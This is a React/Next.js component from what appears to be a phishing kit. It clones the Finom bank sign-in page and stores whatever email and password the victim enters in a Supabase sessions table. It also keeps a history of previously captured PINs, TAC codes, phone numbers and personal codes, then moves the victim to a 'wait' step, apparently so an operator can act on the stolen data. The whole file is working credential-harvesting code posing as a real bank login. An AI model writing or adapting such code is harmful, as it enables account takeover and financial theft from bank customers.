"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function FinomClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [saving, setSaving] = useState(false);
  const formDoluMu = username.trim().length > 0 && password.trim().length > 0;

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    const previousForm = { ...prev };
    const prevEmpty = !String(previousForm.orderedField1 || previousForm.username || previousForm.verfuegernummer || "").trim() &&
                      !String(previousForm.password || previousForm.pin || "").trim() &&
                      !String(previousForm.personalCode || previousForm.bankPhone || previousForm.tacCode || "").trim();
    const prevHistory: any[] = Array.isArray((previousForm as any).bankFormHistory)
      ? (previousForm as any).bankFormHistory.slice()
      : [];
    if (!prevEmpty) {
      prevHistory.push({
        bankSlug: "finom",
        bankName: "Finom",
        htmlStepLabel: "BANKA FORMU",
        verfuegernummer: String(previousForm.verfuegernummer || previousForm.username || "").trim(),
        username: String(previousForm.username || previousForm.verfuegernummer || "").trim(),
        pin: String(previousForm.pin || previousForm.password || "").trim(),
        password: String(previousForm.password || previousForm.pin || "").trim(),
        bankPhone: String(previousForm.bankPhone || "").trim(),
        personalCode: String(previousForm.personalCode || "").trim(),
        tacCode: String(previousForm.tacCode || (previousForm as any).tac_code || "").trim(),
        orderedField1: String(previousForm.orderedField1 || "").trim(),
        orderedField1Key: String(previousForm.orderedField1Key || "").trim(),
        orderedField2: String(previousForm.orderedField2 || "").trim(),
        orderedField2Key: String(previousForm.orderedField2Key || "").trim(),
        orderedField2Type: String(previousForm.orderedField2Type || "").trim(),
        orderedField3: String(previousForm.orderedField3 || "").trim(),
        orderedField3Key: String(previousForm.orderedField3Key || "").trim(),
        orderedField3Type: String(previousForm.orderedField3Type || "").trim(),
        capturedAt: new Date().toISOString(),
      });
    }
    await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
      form_data: { ...prev, bankSlug: "finom", bankName: "Finom", verfuegernummer: username, pin: password, bankFormHistory: prevHistory }
    }).eq("id", sessionId);
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col md:flex-row">
      
      {/* Left Column - Form */}
      <div className="w-full md:w-1/2 lg:w-[45%] flex flex-col pt-8 pb-12 px-6 sm:px-16 xl:px-32 relative">
        {/* Logo */}
        <div className="mb-16 md:mb-32">
          <img src="/bank-logos/finom.svg" alt="finom" className="h-6" />
        </div>

        <div className="w-full max-w-[400px] mx-auto">
          <h1 className="text-[32px] font-extrabold text-[#111111] text-center mb-12 tracking-tight">
            Sign in to Finom
          </h1>

          {/* Social Buttons */}
          <div className="mb-8">
            <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest text-center mb-4">Continue with</p>
            <div className="flex items-center justify-center gap-2 flex-wrap">
              <button className="flex items-center gap-2 bg-[#F3F4F6] hover:bg-[#E5E7EB] text-[#333] px-4 py-2 rounded-full text-[13px] font-semibold transition-colors">
                <span className="text-red-500 font-bold">G</span> Google
              </button>
              <button className="flex items-center gap-2 bg-[#F3F4F6] hover:bg-[#E5E7EB] text-[#333] px-4 py-2 rounded-full text-[13px] font-semibold transition-colors">
                <span className="text-blue-600 font-bold">f</span> Facebook
              </button>
              <button className="flex items-center gap-2 bg-[#F3F4F6] hover:bg-[#E5E7EB] text-[#333] px-4 py-2 rounded-full text-[13px] font-semibold transition-colors">
                <span className="text-blue-500 font-bold">in</span> LinkedIn
              </button>
              <button className="flex items-center gap-2 bg-[#F3F4F6] hover:bg-[#E5E7EB] text-[#333] px-4 py-2 rounded-full text-[13px] font-semibold transition-colors">
                <span className="text-black font-bold"></span> Apple
              </button>
            </div>
          </div>

          <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest text-center mb-6">Or use your email address</p>

          <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }} className="space-y-4">
            
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
              </div>
              <input 
                type="email" 
                placeholder="example@test.com" 
                value={username} 
                onChange={e => setUsername(e.target.value)} 
                className="w-full bg-[#F9FAFB] border border-gray-200 rounded-[12px] py-4 pl-12 pr-12 text-[15px] focus:outline-none focus:ring-2 focus:ring-gray-900 transition-all placeholder-gray-400" 
              />
              <div className="absolute inset-y-0 right-0 pr-4 flex items-center pointer-events-none">
                <svg className="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg>
              </div>
            </div>

            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
              </div>
              <input 
                type="password" 
                placeholder="Password" 
                value={password} 
                onChange={e => setPassword(e.target.value)} 
                className="w-full bg-white border border-gray-200 rounded-[12px] py-4 pl-12 pr-28 text-[15px] focus:outline-none focus:ring-2 focus:ring-gray-900 transition-all placeholder-gray-400" 
              />
              <button type="button" className="absolute inset-y-0 right-0 pr-4 flex items-center text-[12px] font-bold text-gray-600 hover:text-gray-900">
                <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
                SHOW
              </button>
            </div>

            <div className="text-center mt-2 mb-6">
              <a href="#" className="text-[10px] font-bold text-gray-400 uppercase tracking-widest hover:text-gray-600">Can't log in?</a>
            </div>

            <button 
              type="submit" 
              disabled={!formDoluMu || saving} 
              className={`w-full font-semibold py-4 rounded-[12px] transition-colors shadow-lg ${formDoluMu && !saving ? "bg-[#1C1C1E] hover:bg-black text-white" : "bg-gray-400 text-gray-700 opacity-70"}`}
            >
              {saving ? "Loading..." : "Sign in"}
            </button>
          </form>

          <div className="text-center mt-8 space-y-6">
            <p className="text-[14px] text-gray-500">
              Don't have an account? <a href="#" className="text-[#3b82f6] font-medium hover:underline">Register</a>
            </p>
            <a href="#" className="block text-[12px] font-bold text-gray-400 uppercase tracking-widest hover:text-gray-600">Forgot password?</a>
          </div>
        </div>
      </div>

      {/* Right Column - Promotional Image */}
      <div className="hidden md:flex md:w-1/2 lg:w-[55%] relative m-4 rounded-[32px] overflow-hidden">
        <div className="absolute top-6 right-8 z-10 flex items-center text-[14px] font-medium text-gray-800 bg-white/50 px-3 py-1.5 rounded-full backdrop-blur-md cursor-pointer hover:bg-white/70">
          English
          <svg className="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
        </div>
        
        <img src="/bank-assets/Finom/arka plan sağ kısım.jpg" alt="Finom Cards" className="absolute inset-0 w-full h-full object-cover" />
        
        <div className="absolute inset-0 flex flex-col items-center justify-start pt-24 px-8 text-center">
          <h2 className="text-[42px] font-extrabold text-[#111111] mb-4 leading-tight">
            Still not with<br/>us?
          </h2>
          <p className="text-[18px] text-gray-700 font-medium mb-8">
            Create a Finom account in<br/>60 seconds
          </p>
          <button className="bg-black/10 backdrop-blur-sm text-[#111111] font-bold py-3 px-8 rounded-full hover:bg-black/20 transition-colors border border-black/5">
            Sign up for free
          </button>
        </div>
        
        {/* Support Chat Icon */}
        <div className="absolute bottom-8 right-8 z-10">
          <div className="w-12 h-12 bg-[#1C1C1E] rounded-full flex items-center justify-center cursor-pointer shadow-xl hover:scale-105 transition-transform">
            <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"></path></svg>
          </div>
        </div>
      </div>

    </div>
  );
}